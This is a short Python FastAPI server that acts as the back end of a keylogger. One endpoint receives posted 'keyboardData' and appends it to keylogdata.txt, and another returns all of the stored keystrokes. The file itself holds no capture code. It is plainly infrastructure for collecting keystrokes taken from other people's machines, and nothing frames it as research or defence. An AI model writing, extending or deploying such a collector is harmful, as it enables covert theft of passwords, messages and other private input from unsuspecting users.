from fastapi import FastAPI

from model import KeyLogData 

import uvicorn

app = FastAPI()

@app.get("/datas")
def get_data():
    data = ""
    try:
        with open('keylogdata.txt', 'r') as f:
            for line in f.readlines():
                data += f"{line}\n"
        return {'data' : data}
    except:
        return {"data": "Can't get the data"}

@app.post("/post")
def post_data(data: KeyLogData):
    data_dict = data.dict()
    try:
        with open('keylogdata.txt','a') as f:
            f.write(f"{data_dict['keyboardData']}\n")
    except:
        return {'data':"Can't create data"}
    # return {'data':data}

# if __name__ == "__main__":
#     uvicorn.run(app, host="127.0.0.0", port=8080)